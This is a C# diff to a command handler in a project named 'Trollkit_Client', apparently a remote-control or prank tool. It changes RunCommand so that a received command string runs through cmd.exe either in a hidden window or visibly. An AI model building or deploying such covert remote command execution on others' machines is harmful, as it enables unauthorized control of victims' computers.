@@ -45,14 +45,27 @@ namespace Trollkit_Client.Modules.CommandHandlers
 
 		private void RunCommand(string command)
 		{
+			string[] values = command.Split(',');
+			if (values[1] == "hidden")
+			{
+				System.Diagnostics.Process process = new System.Diagnostics.Process();
+				System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+				startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+				startInfo.FileName = "cmd.exe";
+				startInfo.Arguments = $"/C {command}";
+				process.StartInfo = startInfo;
+				process.Start();
+			}
+			else if (values[1] == "show")
+			{
+				System.Diagnostics.Process.Start("CMD.exe", $"/C {command} & pause");
+			}
+			else
+			{ 
+			
+			}
+
 			//test command = explorer https://google.com
-			System.Diagnostics.Process process = new System.Diagnostics.Process();
-			System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
-			startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-			startInfo.FileName = "cmd.exe";
-			startInfo.Arguments = $"/C {command}"; 
-			process.StartInfo = startInfo;
-			process.Start();
 		}
 
 		private void AltTab()
